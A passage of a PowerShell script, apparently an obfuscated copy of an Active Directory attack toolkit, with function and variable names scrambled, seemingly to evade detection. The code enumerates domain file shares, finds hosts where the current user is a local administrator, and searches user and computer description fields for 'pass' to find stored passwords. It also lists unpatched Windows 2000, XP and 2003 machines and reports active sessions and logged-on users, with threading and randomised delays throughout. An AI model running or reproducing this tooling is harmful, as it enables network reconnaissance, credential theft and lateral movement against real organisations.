                                    $f=[IO.Directory]::GetFiles($path)
                                    
                                    $cmd = "locket -Path $path $(if($Terms){`"-Terms $($Terms -join ',')`"}) $(if($qWuauHEy99){`"-ExcludeFolders`"}) $(if($UcUfahUc99){`"-OfficeDocs`"}) $(if($oyatszxc99){`"-ExcludeHidden`"}) $(if($YrBDvecf99){`"-FreshEXES`"}) $(if($qlDFbOCS99){`"-CheckWriteAccess`"}) $(if($JeGOQmAv99){`"-OutFile $JeGOQmAv99`"})"
                                    
                                    Write-Verbose "[*] Enumerating share $path"
                                    
                                    Invoke-Expression $cmd
                                }
                                catch {}
                                
                            } 
                            
                        }
                        
                    }
                }   
            }
        }
    }
}
function pigsties {
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,
        [string]
        $nMIWdEkf99,
        [string]
        $HGrbOFdX99,
        [string]
        $DpZrNWOF99,
        
        [Switch]
        $UcUfahUc99,
        [Switch]
        $YrBDvecf99,
        
        [string[]]
        $Terms,
        
        [string]
        $rlhLsJBJ99 = '1/1/1970',
        
        [string]
        $beHpfBFb99 = '1/1/1970',
        
        [string]
        $TnvLvEKe99 = '1/1/1970',
        
        [Switch] 
        $edFFSqoq99,
        
        [Switch] 
        $YDtvujQH99,
        
        [Switch] 
        $qWuauHEy99,
        
        [Switch] 
        $oyatszxc99,
        
        [Switch] 
        $qlDFbOCS99,
        
        [Switch]
        $UfipYUon99,
        [string]
        $dOCGgZVW99,
        [Int]
        $sPSLbcro99 = 10
    )
    
    begin {
        If ($PSBoundParameters['Debug']) {
            $vPuRmPba99 = 'Continue'
        }
        
        [String[]] $lxaLbpar99 = @("C$", "ADMIN$")
        
        if ($edFFSqoq99){
            if ($YDtvujQH99){
                $lxaLbpar99 = @()
            }
            else{
                $lxaLbpar99 = @("ADMIN$")
            }
        }
        if ($YDtvujQH99){
            if ($edFFSqoq99){
                $lxaLbpar99 = @()
            }
            else{
                $lxaLbpar99 = @("C$")
            }
        }
        
        if($dOCGgZVW99){
            $rYtPqZdr99 = $dOCGgZVW99
        }
        else{
            $rYtPqZdr99 = $null
        }
        
        Write-Verbose "[*] Running pigsties with delay of $Delay"
        if($rYtPqZdr99){
            Write-Verbose "[*] Domain: $rYtPqZdr99"
        }
        $bphkWboz99 = @()
        $VjBSuPpJ99 = @()
        if($DpZrNWOF99){
            if (Test-Path -Path $DpZrNWOF99){
                foreach ($Item in Get-Content -Path $DpZrNWOF99) {
                    if (($Item -ne $null) -and ($Item.trim() -ne '')){
                        $share = $Item.Split("`t")[0]
                        $bphkWboz99 += $share
                    }
                }
            }
            else {
                Write-Warning "`r`n[!] Input file '$DpZrNWOF99' doesn't exist!`r`n"
                return $null
            }
        }
        else{
            if($nMIWdEkf99){
                if (Test-Path -Path $nMIWdEkf99){
                    $Hosts = Get-Content -Path $nMIWdEkf99
                }
                else{
                    Write-Warning "[!] Input file '$nMIWdEkf99' doesn't exist!"
                    "[!] Input file '$nMIWdEkf99' doesn't exist!"
                    return
                }
            }
            elseif($HGrbOFdX99){
                Write-Verbose "[*] Querying domain $rYtPqZdr99 for hosts with filter '$HGrbOFdX99'`r`n"
                $Hosts = AOL -dOCGgZVW99 $rYtPqZdr99 -uVOoDBse99 $HGrbOFdX99
            }
        }
        $eIUFbTEo99 = {
            param($Share, $Terms, $qWuauHEy99, $oyatszxc99, $YrBDvecf99, $UcUfahUc99, $qlDFbOCS99)
            
            $cmd = "locket -Path $share $(if($Terms){`"-Terms $($Terms -join ',')`"}) $(if($qWuauHEy99){`"-ExcludeFolders`"}) $(if($oyatszxc99){`"-ExcludeHidden`"}) $(if($YrBDvecf99){`"-FreshEXES`"}) $(if($UcUfahUc99){`"-OfficeDocs`"}) $(if($qlDFbOCS99){`"-CheckWriteAccess`"})"
            Write-Verbose "[*] Enumerating share $share"
            Invoke-Expression $cmd    
        }
        $iATbdRnY99 = {
            param($LxIyYIwe99, $Ping, $lxaLbpar99, $Terms, $qWuauHEy99, $UcUfahUc99, $oyatszxc99, $YrBDvecf99, $qlDFbOCS99)
            $up = $true
            if($Ping){
                $up = disorganize -LxIyYIwe99 $LxIyYIwe99
            }
            if($up){
                $bphkWboz99 = Carly -uVOoDBse99 $LxIyYIwe99
                foreach ($share in $bphkWboz99) {
                    $sGWzjfsu99 = $share.shi1_netname
                    $ITkhsIQD99 = $share.shi1_remark
                    $path = '\\'+$LxIyYIwe99+'\'+$sGWzjfsu99
                    
                    if (($sGWzjfsu99) -and ($sGWzjfsu99.trim() -ne '')){
                        
                        if ($lxaLbpar99 -notcontains $sGWzjfsu99.ToUpper()){
                            try{
                                $f=[IO.Directory]::GetFiles($path)
                                $cmd = "locket -Path $path $(if($Terms){`"-Terms $($Terms -join ',')`"}) $(if($qWuauHEy99){`"-ExcludeFolders`"}) $(if($UcUfahUc99){`"-OfficeDocs`"}) $(if($oyatszxc99){`"-ExcludeHidden`"}) $(if($YrBDvecf99){`"-FreshEXES`"}) $(if($qlDFbOCS99){`"-CheckWriteAccess`"})"
                                Invoke-Expression $cmd
                            }
                            catch {
                                Write-Debug "[!] No access to $path"
                            }
                        } 
                    }
                }
                
            }
        }
        $ZQLNnLLm99 = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        $ZQLNnLLm99.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()
     
        $SMmnrEFb99 = Get-Variable -Scope 1
     
        $dUtpewzr99 = @("?","args","ConsoleFileName","Error","ExecutionContext","false","HOME","Host","input","InputObject","MaximumAliasCount","MaximumDriveCount","MaximumErrorCount","MaximumFunctionCount","MaximumHistoryCount","MaximumVariableCount","MyInvocation","null","PID","PSBoundParameters","PSCommandPath","PSCulture","PSDefaultParameterValues","PSHOME","PSScriptRoot","PSUICulture","PSVersionTable","PWD","ShellId","SynchronizedHash","true")
     
        ForEach($Var in $SMmnrEFb99) {
            If($dUtpewzr99 -notcontains $Var.Name) {
            $ZQLNnLLm99.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
            }
        }
        ForEach($ayushNav99 in (Get-ChildItem Function:)) {
            $ZQLNnLLm99.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $ayushNav99.Name, $ayushNav99.Definition))
        }
     
        $BzMQEsAu99 = 0
        $pool = [runspacefactory]::CreateRunspacePool(1, $sPSLbcro99, $ZQLNnLLm99, $host)
        $pool.Open()
        $jobs = @()   
        $ps = @()   
        $wait = @()
    }
    process {
        if ($DpZrNWOF99){
            foreach ($share in $bphkWboz99){  
                $BzMQEsAu99 = $BzMQEsAu99 + 1
                if ($share -ne ''){
                    Write-Verbose "[*] Enumerating share $share ($BzMQEsAu99 of $($bphkWboz99.count))"
                    While ($($pool.GetAvailableRunspaces()) -le 0) {
                        Start-Sleep -milliseconds 500
                    }
            
                    $ps += [powershell]::create()
           
                    $ps[$BzMQEsAu99].runspacepool = $pool
                    [void]$ps[$BzMQEsAu99].AddScript($eIUFbTEo99).AddParameter('Share', $Share).AddParameter('Terms', $Terms).AddParameter('ExcludeFolders', $qWuauHEy99).AddParameter('ExcludeHidden', $oyatszxc99).AddParameter('FreshEXES', $YrBDvecf99).AddParameter('OfficeDocs', $UcUfahUc99).AddParameter('CheckWriteAccess', $qlDFbOCS99).AddParameter('OutFile', $JeGOQmAv99)
                    $jobs += $ps[$BzMQEsAu99].BeginInvoke();
             
                    $wait += $jobs[$BzMQEsAu99].AsyncWaitHandle
                }
            }
        }
        else{
            if ( (-not ($Hosts)) -or ($Hosts.length -eq 0)) {
                Write-Verbose "[*] Querying domain $rYtPqZdr99 for hosts...`r`n"
                $Hosts = AOL -dOCGgZVW99 $rYtPqZdr99
            }
            
            $Hosts = supernovae $Hosts
            foreach ($LxIyYIwe99 in $Hosts){     
                
                $BzMQEsAu99 = $BzMQEsAu99 + 1
                if ($LxIyYIwe99 -ne ''){
                    Write-Verbose "[*] Enumerating server $LxIyYIwe99 ($BzMQEsAu99 of $($Hosts.count))"
                    While ($($pool.GetAvailableRunspaces()) -le 0) {
                        Start-Sleep -milliseconds 500
                    }
            
                    $ps += [powershell]::create()
           
                    $ps[$BzMQEsAu99].runspacepool = $pool
                   [void]$ps[$BzMQEsAu99].AddScript($iATbdRnY99).AddParameter('Server', $LxIyYIwe99).AddParameter('Ping', -not $UfipYUon99).AddParameter('excludedShares', $lxaLbpar99).AddParameter('Terms', $Terms).AddParameter('ExcludeFolders', $qWuauHEy99).AddParameter('OfficeDocs', $UcUfahUc99).AddParameter('ExcludeHidden', $oyatszxc99).AddParameter('FreshEXES', $YrBDvecf99).AddParameter('CheckWriteAccess', $qlDFbOCS99).AddParameter('OutFile', $JeGOQmAv99)
                    
                    $jobs += $ps[$BzMQEsAu99].BeginInvoke();
             
                    $wait += $jobs[$BzMQEsAu99].AsyncWaitHandle
                }
            }
        }
    }
    end {
        Write-Verbose "Waiting for scanning threads to finish..."
        $VKYYmkzK99 = Get-Date
        while ($($jobs | ? {$_.IsCompleted -eq $false}).count -gt 0 -or $($($(Get-Date) - $VKYYmkzK99).totalSeconds) -gt 60) {
                Start-Sleep -milliseconds 500
            } 
        for ($y = 0; $y -lt $BzMQEsAu99; $y++) {     
            try {   
                $ps[$y].EndInvoke($jobs[$y])   
            } catch {
                Write-Warning "error: $_"  
            }
            finally {
                $ps[$y].Dispose()
            }    
        }
        $pool.Dispose()
    }
}
function educated {
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,
        [string]
        $nMIWdEkf99,
        [string]
        $HGrbOFdX99,
        [Switch]
        $UfipYUon99,
        
        [UInt32]
        $Delay = 0,
        
        [double]
        $OTbZbzgr99 = .3,
        
        [string]
        $dOCGgZVW99
    )
    begin {
    
        If ($PSBoundParameters['Debug']) {
            $vPuRmPba99 = 'Continue'
        }
        
        $iyhvNPNI99 = overshare
        
        $wmnsBtCQ99 = New-Object System.Random
        
        if($dOCGgZVW99){
            $rYtPqZdr99 = $dOCGgZVW99
        }
        else{
            $rYtPqZdr99 = $null
        }
        Write-Verbose "[*] Running educated with delay of $Delay"
        if($rYtPqZdr99){
            Write-Verbose "[*] Domain: $rYtPqZdr99"
        }
        if($nMIWdEkf99){
            if (Test-Path -Path $nMIWdEkf99){
                $Hosts = Get-Content -Path $nMIWdEkf99
            }
            else{
                Write-Warning "[!] Input file '$nMIWdEkf99' doesn't exist!"
                return
            }
        }
        elseif($HGrbOFdX99){
            Write-Verbose "[*] Querying domain $rYtPqZdr99 for hosts with filter '$HGrbOFdX99'`r`n"
            $Hosts = AOL -dOCGgZVW99 $rYtPqZdr99 -uVOoDBse99 $HGrbOFdX99
        }
    }
        
    process {
        if ( (-not ($Hosts)) -or ($Hosts.length -eq 0)) {
            Write-Verbose "[*] Querying domain $rYtPqZdr99 for hosts...`r`n"
            $Hosts = AOL -dOCGgZVW99 $rYtPqZdr99
        }
        
        $Hosts = supernovae $Hosts
 
        $BzMQEsAu99 = 0
        
        foreach ($LxIyYIwe99 in $Hosts){
            
            $BzMQEsAu99 = $BzMQEsAu99 + 1
            
            Write-Verbose "[*] Enumerating server $LxIyYIwe99 ($BzMQEsAu99 of $($Hosts.count))"
            Start-Sleep -Seconds $wmnsBtCQ99.Next((1-$OTbZbzgr99)*$Delay, (1+$OTbZbzgr99)*$Delay)
            
            $up = $true
            if(-not $UfipYUon99){
                $up = disorganize -LxIyYIwe99 $LxIyYIwe99
            }
            if($up){
                $lllxKUTh99 = Dave -uVOoDBse99 $LxIyYIwe99
                if ($lllxKUTh99) {
                    $ip = deltas -uVOoDBse99 $LxIyYIwe99
                    Write-Verbose "[+] Current user '$iyhvNPNI99' has local admin access on $LxIyYIwe99 ($ip)"
                    $LxIyYIwe99
                }
            }
        }
    }
}
function caterwaul {
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,
        [string]
        $nMIWdEkf99,
        [string]
        $HGrbOFdX99,
        [Switch]
        $UfipYUon99,
        [string]
        $dOCGgZVW99,
        [Int]
        $sPSLbcro99=10
    )
    
    begin {
        If ($PSBoundParameters['Debug']) {
            $vPuRmPba99 = 'Continue'
        }
        
        $iyhvNPNI99 = overshare
        
        $wmnsBtCQ99 = New-Object System.Random
        
        if($dOCGgZVW99){
            $rYtPqZdr99 = $dOCGgZVW99
        }
        else{
            $rYtPqZdr99 = $null
        }
        Write-Verbose "[*] Running caterwaul with delay of $Delay"
        if($rYtPqZdr99){
            Write-Verbose "[*] Domain: $rYtPqZdr99"
        }
        if($nMIWdEkf99){
            if (Test-Path -Path $nMIWdEkf99){
                $Hosts = Get-Content -Path $nMIWdEkf99
            }
            else{
                Write-Warning "[!] Input file '$nMIWdEkf99' doesn't exist!"
                return
            }
        }
        elseif($HGrbOFdX99){
            Write-Verbose "[*] Querying domain $rYtPqZdr99 for hosts with filter '$HGrbOFdX99'`r`n"
            $Hosts = AOL -dOCGgZVW99 $rYtPqZdr99 -uVOoDBse99 $HGrbOFdX99
        }
        
        $iATbdRnY99 = {
            param($LxIyYIwe99, $Ping, $iyhvNPNI99)
            $up = $true
            if($Ping){
                $up = disorganize -LxIyYIwe99 $LxIyYIwe99
            }
            if($up){
                $lllxKUTh99 = Dave -uVOoDBse99 $LxIyYIwe99
                if ($lllxKUTh99) {
                    $ip = deltas -uVOoDBse99 $LxIyYIwe99
                    Write-Verbose "[+] Current user '$iyhvNPNI99' has local admin access on $LxIyYIwe99 ($ip)"
                    $LxIyYIwe99
                }
            }
        }
        $ZQLNnLLm99 = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        $ZQLNnLLm99.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()
     
        $SMmnrEFb99 = Get-Variable -Scope 1
     
        $dUtpewzr99 = @("?","args","ConsoleFileName","Error","ExecutionContext","false","HOME","Host","input","InputObject","MaximumAliasCount","MaximumDriveCount","MaximumErrorCount","MaximumFunctionCount","MaximumHistoryCount","MaximumVariableCount","MyInvocation","null","PID","PSBoundParameters","PSCommandPath","PSCulture","PSDefaultParameterValues","PSHOME","PSScriptRoot","PSUICulture","PSVersionTable","PWD","ShellId","SynchronizedHash","true")
     
        ForEach($Var in $SMmnrEFb99) {
            If($dUtpewzr99 -notcontains $Var.Name) {
            $ZQLNnLLm99.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
            }
        }
        ForEach($ayushNav99 in (Get-ChildItem Function:)) {
            $ZQLNnLLm99.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $ayushNav99.Name, $ayushNav99.Definition))
        }
     
        $BzMQEsAu99 = 0
        $pool = [runspacefactory]::CreateRunspacePool(1, $sPSLbcro99, $ZQLNnLLm99, $host)
        $pool.Open()
        $jobs = @()   
        $ps = @()   
        $wait = @()
        $BzMQEsAu99 = 0
    }
    process {
        if ( (-not ($Hosts)) -or ($Hosts.length -eq 0)) {
            Write-Verbose "[*] Querying domain $rYtPqZdr99 for hosts...`r`n"
            $Hosts = AOL -dOCGgZVW99 $rYtPqZdr99
        }
        
        $Hosts = supernovae $Hosts
        $sczGJifQ99 = $Hosts.Count
        Write-Verbose "[*] Total number of hosts: $sczGJifQ99"
        foreach ($LxIyYIwe99 in $Hosts){
            
            $BzMQEsAu99 = $BzMQEsAu99 + 1            
            
            if ($LxIyYIwe99 -ne ''){
                Write-Verbose "[*] Enumerating server $LxIyYIwe99 ($BzMQEsAu99 of $($Hosts.count))"
                While ($($pool.GetAvailableRunspaces()) -le 0) {
                    Start-Sleep -milliseconds 500
                }
        
                $ps += [powershell]::create()
       
                $ps[$BzMQEsAu99].runspacepool = $pool
                [void]$ps[$BzMQEsAu99].AddScript($iATbdRnY99).AddParameter('Server', $LxIyYIwe99).AddParameter('Ping', -not $UfipYUon99).AddParameter('CurrentUser', $iyhvNPNI99)
        
                $jobs += $ps[$BzMQEsAu99].BeginInvoke();
         
                $wait += $jobs[$BzMQEsAu99].AsyncWaitHandle
            }
        }
    }
    end {
        Write-Verbose "Waiting for scanning threads to finish..."
        $VKYYmkzK99 = Get-Date
        while ($($jobs | ? {$_.IsCompleted -eq $false}).count -gt 0 -or $($($(Get-Date) - $VKYYmkzK99).totalSeconds) -gt 60) {
                Start-Sleep -milliseconds 500
            } 
        for ($y = 0; $y -lt $BzMQEsAu99; $y++) {     
            try {   
                $ps[$y].EndInvoke($jobs[$y])   
            } catch {
                Write-Warning "error: $_"  
            }
            finally {
                $ps[$y].Dispose()
            }    
        }
        $pool.Dispose()
    }
}
function limpid {
    
    [CmdletBinding()]
    param(
        [string]
        $Field = 'description',
        [string]
        $Term = 'pass',
        
        [string]
        $dOCGgZVW99
    )
    
    if ($dOCGgZVW99){
        $users = bounciest -dOCGgZVW99 $dOCGgZVW99
    }
    else{
        $users = bounciest
    }
    
    foreach ($user in $users){
        
        $desc = $user.($Field)
        
        if ($desc){
            $desc = $desc[0].ToString().ToLower()
        }
        if ( ($desc -ne $null) -and ($desc.Contains($Term.ToLower())) ){
            $u = $user.samaccountname[0]
            $out = New-Object System.Collections.Specialized.OrderedDictionary
            $out.add('User', $u)
            $out.add($Field, $desc)
            $out
        }
    }
}
function unaccustomed {
    
    [CmdletBinding()]
    param(
        [string]
        $Field = 'description',
        [string]
        $Term = 'pass',
        [string]
        $dOCGgZVW99
    )
    
    if ($dOCGgZVW99){
        try{
            $zrCEhkbw99 = ([Array](popularly))[0].Name
        }
        catch{
            $zrCEhkbw99 = $Null
        }
        try {
            $dn = "DC=$($dOCGgZVW99.Replace('.', ',DC='))"
            if($zrCEhkbw99){
                $QBVQanaY99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$zrCEhkbw99/$dn")
            }
            else{
                $QBVQanaY99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn") 
            }
            $QBVQanaY99.filter='(&(objectClass=Computer))'
            
        }
        catch{
            Write-Warning "The specified domain $dOCGgZVW99 does not exist, could not be contacted, or there isn't an existing trust."
        }
    }
    else{
        $QBVQanaY99 = [adsisearcher]'(&(objectClass=Computer))'
    }
    
    if ($QBVQanaY99){
        
        $QBVQanaY99.PageSize = 200
        
        $QBVQanaY99.FindAll() | ForEach-Object {
            
            $desc = $_.Properties.$Field
            
            if ($desc){
                $desc = $desc[0].ToString().ToLower()
            }
            if ( ($desc -ne $null) -and ($desc.Contains($Term.ToLower())) ){
                $c = $_.Properties.name
                $out = New-Object System.Collections.Specialized.OrderedDictionary
                $out.add('Computer', $c)
                $out.add($Field, $desc)
                $out
            }
        }
    }
    
}
function Tahoe {
    
    [CmdletBinding()]
    param(
        [Switch]
        $KACNAvrx99,
        [Switch]
        $Ping,
        [string]
        $dOCGgZVW99
    )
    
    if($dOCGgZVW99){
        $rYtPqZdr99 = $dOCGgZVW99
    }
    else{
        $rYtPqZdr99 = $null
    }
    
    $VjBSuPpJ99 = AOL -KACNAvrx99 $rYtPqZdr99
    
    $PqpwhYBg99 = $VjBSuPpJ99 | Where-Object {$_.OperatingSystem -match '.*2000.*'}
    
    $WeoXnOLl99 = $VjBSuPpJ99 | Where-Object {$_.OperatingSystem -match '.*XP.*' -and $_.ServicePack -notmatch '.*3.*'}
    
    $jRLvMbdT99 = $VjBSuPpJ99 | Where-Object {$_.OperatingSystem -match '.*2003.*' -and $_.ServicePack -match '.*1.*'}
    
    
    if ($KACNAvrx99){
        if($Ping){
            if ($PqpwhYBg99) { $PqpwhYBg99 | Where-Object { disorganize -LxIyYIwe99 $_.HostName } }
            if ($WeoXnOLl99) { $WeoXnOLl99 | Where-Object { disorganize -LxIyYIwe99 $_.HostName } }
            if ($jRLvMbdT99) { $jRLvMbdT99 | Where-Object { disorganize -LxIyYIwe99 $_.HostName } }
        }
        else{
            $PqpwhYBg99 
            $WeoXnOLl99
            $jRLvMbdT99
        }
    }
    else{
        if($Ping){
            if($PqpwhYBg99) { $PqpwhYBg99 | Where-Object {disorganize -LxIyYIwe99 $_.HostName} | ForEach-Object {$_.HostName} }
            if($WeoXnOLl99) { $WeoXnOLl99 | Where-Object {disorganize -LxIyYIwe99 $_.HostName} | ForEach-Object {$_.HostName} }
            if($jRLvMbdT99) { $jRLvMbdT99 | Where-Object {disorganize -LxIyYIwe99 $_.HostName} | ForEach-Object {$_.HostName} }
        }
        else {
            $PqpwhYBg99 | ForEach-Object {$_.HostName}
            $WeoXnOLl99 | ForEach-Object {$_.HostName}
            $jRLvMbdT99 | ForEach-Object {$_.HostName}
        }
    }
}
function trisects {
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,
        [string]
        $nMIWdEkf99,
        [string]
        $HGrbOFdX99,
      
        [Switch]
        $UfipYUon99,
        
        [UInt32]
        $Delay = 0,
        
        [double]
        $OTbZbzgr99 = .3,
        
        [string]
        $JeGOQmAv99,
        
        [string]
        $dOCGgZVW99
    )
    
    begin {
        If ($PSBoundParameters['Debug']) {
            $vPuRmPba99 = 'Continue'
        }
        
        if($dOCGgZVW99){
            $rYtPqZdr99 = $dOCGgZVW99
        }
        else{
            $rYtPqZdr99 = $null
        }
        
        Write-Verbose "[*] Running trisects with delay of $Delay"
        if($rYtPqZdr99){
            Write-Verbose "[*] Domain: $rYtPqZdr99"
        }
        $wmnsBtCQ99 = New-Object System.Random
        
        if($nMIWdEkf99){
            if (Test-Path -Path $nMIWdEkf99){
                $Hosts = Get-Content -Path $nMIWdEkf99
            }
            else{
                Write-Warning "[!] Input file '$nMIWdEkf99' doesn't exist!"
                return
            }
        }
        elseif($HGrbOFdX99){
            Write-Verbose "[*] Querying domain $rYtPqZdr99 for hosts with filter '$HGrbOFdX99'`r`n"
            $Hosts = AOL -dOCGgZVW99 $rYtPqZdr99 -uVOoDBse99 $HGrbOFdX99
        }
        If ($JeGOQmAv99 -and (Test-Path -Path $JeGOQmAv99)){ Remove-Item -Path $JeGOQmAv99 }
    }
    process{
        if ( (-not ($Hosts)) -or ($Hosts.length -eq 0)) {
            Write-Verbose "[*] Querying domain $rYtPqZdr99 for hosts...`r`n"
            $Hosts = AOL -dOCGgZVW99 $rYtPqZdr99
        }
        
        $Hosts = supernovae $Hosts
 
        $BzMQEsAu99 = 0
        
        foreach ($LxIyYIwe99 in $Hosts){
            
            $BzMQEsAu99 = $BzMQEsAu99 + 1
            
            Write-Verbose "[*] Enumerating server $LxIyYIwe99 ($BzMQEsAu99 of $($Hosts.count))"
            
            Start-Sleep -Seconds $wmnsBtCQ99.Next((1-$OTbZbzgr99)*$Delay, (1+$OTbZbzgr99)*$Delay)
            
            $up = $true
            if(-not $UfipYUon99){
                $up = disorganize -LxIyYIwe99 $LxIyYIwe99
            }
            if($up){
                $users = douches -uVOoDBse99 $LxIyYIwe99
                if($users -and ($users.Length -ne 0)){
                    if($JeGOQmAv99){
                        $users | export-csv -zUlyMMyD99 -notypeinformation -path $JeGOQmAv99
                    }
                    else{
                        $users
                    }
                }
                else{
                    Write-Verbose "[!] No users returned from $LxIyYIwe99"
                }
            }   
        }
    }
}
function languishing {
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,
        [string]
        $nMIWdEkf99,
        [string]
        $HGrbOFdX99,
        [Switch]
        $UfipYUon99,
        
        [string]
        $dOCGgZVW99,
        [Int]
        $sPSLbcro99 = 10
    )
    
    begin {
        If ($PSBoundParameters['Debug']) {
            $vPuRmPba99 = 'Continue'
        }
        
        if($dOCGgZVW99){
            $rYtPqZdr99 = $dOCGgZVW99
        }
        else{
            $rYtPqZdr99 = $null
        }
        
        Write-Verbose "[*] Running languishing with delay of $Delay"
        if($rYtPqZdr99){
            Write-Verbose "[*] Domain: $rYtPqZdr99"
        }
        if($nMIWdEkf99){
            if (Test-Path -Path $nMIWdEkf99){
                $Hosts = Get-Content -Path $nMIWdEkf99
            }
            else{
                Write-Warning "[!] Input file '$nMIWdEkf99' doesn't exist!"
                "[!] Input file '$nMIWdEkf99' doesn't exist!"
                return
            }
        }
        elseif($HGrbOFdX99){
            Write-Verbose "[*] Querying domain $rYtPqZdr99 for hosts with filter '$HGrbOFdX99'`r`n"
            $Hosts = AOL -dOCGgZVW99 $rYtPqZdr99 -uVOoDBse99 $HGrbOFdX99
        }
        $iATbdRnY99 ={
            param($LxIyYIwe99, $Ping)
            $up = $true
            if($Ping){
                $up = disorganize -LxIyYIwe99 $LxIyYIwe99
            }
            if($up){
                $users = douches -uVOoDBse99 $LxIyYIwe99
                if($users -and ($users.Length -ne 0)){
                    $users
                }
                else{
                    Write-Verbose "[!] No users returned from $LxIyYIwe99"
                }
            }
        }
        $ZQLNnLLm99 = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        $ZQLNnLLm99.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()
     
        $SMmnrEFb99 = Get-Variable -Scope 1
     
        $dUtpewzr99 = @("?","args","ConsoleFileName","Error","ExecutionContext","false","HOME","Host","input","InputObject","MaximumAliasCount","MaximumDriveCount","MaximumErrorCount","MaximumFunctionCount","MaximumHistoryCount","MaximumVariableCount","MyInvocation","null","PID","PSBoundParameters","PSCommandPath","PSCulture","PSDefaultParameterValues","PSHOME","PSScriptRoot","PSUICulture","PSVersionTable","PWD","ShellId","SynchronizedHash","true")
     
        ForEach($Var in $SMmnrEFb99) {
            If($dUtpewzr99 -notcontains $Var.Name) {
            $ZQLNnLLm99.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
            }
        }
        ForEach($ayushNav99 in (Get-ChildItem Function:)) {
            $ZQLNnLLm99.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $ayushNav99.Name, $ayushNav99.Definition))
        }
     
        $BzMQEsAu99 = 0
        $pool = [runspacefactory]::CreateRunspacePool(1, $sPSLbcro99, $ZQLNnLLm99, $host)
        $pool.Open()
        $jobs = @()   
        $ps = @()   
        $wait = @()
        $BzMQEsAu99 = 0
    }
    process {
        if ( (-not ($Hosts)) -or ($Hosts.length -eq 0)) {
            Write-Verbose "[*] Querying domain $rYtPqZdr99 for hosts...`r`n"
            $Hosts = AOL -dOCGgZVW99 $rYtPqZdr99
        }
        
        $Hosts = supernovae $Hosts
        $sczGJifQ99 = $Hosts.Count
        Write-Verbose "[*] Total number of hosts: $sczGJifQ99"
        foreach ($LxIyYIwe99 in $Hosts){
            
            $BzMQEsAu99 = $BzMQEsAu99 + 1
            
            if ($LxIyYIwe99 -ne ''){
                Write-Verbose "[*] Enumerating server $LxIyYIwe99 ($BzMQEsAu99 of $($Hosts.count))"
                While ($($pool.GetAvailableRunspaces()) -le 0) {
                    Start-Sleep -milliseconds 500
                }
        
                $ps += [powershell]::create()
       
                $ps[$BzMQEsAu99].runspacepool = $pool
                [void]$ps[$BzMQEsAu99].AddScript($iATbdRnY99).AddParameter('Server', $LxIyYIwe99).AddParameter('Ping', -not $UfipYUon99)
        
                $jobs += $ps[$BzMQEsAu99].BeginInvoke();
         
                $wait += $jobs[$BzMQEsAu99].AsyncWaitHandle
            }
        }
    }
    end {
        Write-Verbose "Waiting for scanning threads to finish..."
        $VKYYmkzK99 = Get-Date
        while ($($jobs | ? {$_.IsCompleted -eq $false}).count -gt 0 -or $($($(Get-Date) - $VKYYmkzK99).totalSeconds) -gt 60) {
                Start-Sleep -milliseconds 500
            } 
        for ($y = 0; $y -lt $BzMQEsAu99; $y++) {     
            try {   
                $ps[$y].EndInvoke($jobs[$y])   
            } catch {
                Write-Warning "error: $_"  
            }
            finally {
                $ps[$y].Dispose()
            }    
        }
        $pool.Dispose()
    }
}
function singsonged {
    
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True)]
        [string]
        $uVOoDBse99
    )
    
    If ($PSBoundParameters['Debug']) {
        $vPuRmPba99 = 'Continue'
    }
    
    "[+] singsonged Report: $uVOoDBse99"
    
    $MrMjaTak99 = AOL -Hostname "$uVOoDBse99*" -KACNAvrx99 | Out-String
    "`n[+] AD query for: $uVOoDBse99"
     $MrMjaTak99.Trim()
    
    $GvlpoKNj99 = swagged -uVOoDBse99 $uVOoDBse99
    if ($GvlpoKNj99 -and ($GvlpoKNj99.Count -ne 0)){
        "`n[+] Active sessions for $uVOoDBse99 :"
    }
    foreach ($ddqEcwGf99 in $GvlpoKNj99) {
        $EOQyLHjF99 = $ddqEcwGf99.sesi10_username
        $cname = $ddqEcwGf99.sesi10_cname
        $vhYWUsCi99 = $ddqEcwGf99.sesi10_time
        $FmOpRXrU99 = $ddqEcwGf99.sesi10_idle_time
        if (($EOQyLHjF99 -ne $null) -and ($EOQyLHjF99.trim() -ne '')){
            "[+] $uVOoDBse99 - Session - $EOQyLHjF99 from $cname - Active: $vhYWUsCi99 - Idle: $FmOpRXrU99"
        }
    }
    
    $users = Pentecost -uVOoDBse99 $uVOoDBse99
    if ($users -and ($users.Count -ne 0)){
        "`n[+] Users logged onto $uVOoDBse99 :"
    }
    foreach ($user in $users) {
        $EOQyLHjF99 = $user.wkui1_username
        $dOCGgZVW99 = $user.wkui1_logon_domain
        
        if ($EOQyLHjF99 -ne $null){
            if ( !$EOQyLHjF99.EndsWith("$") ) {
                "[+] $uVOoDBse99 - Logged-on - $dOCGgZVW99\\$EOQyLHjF99"
            }
        }
    }
    
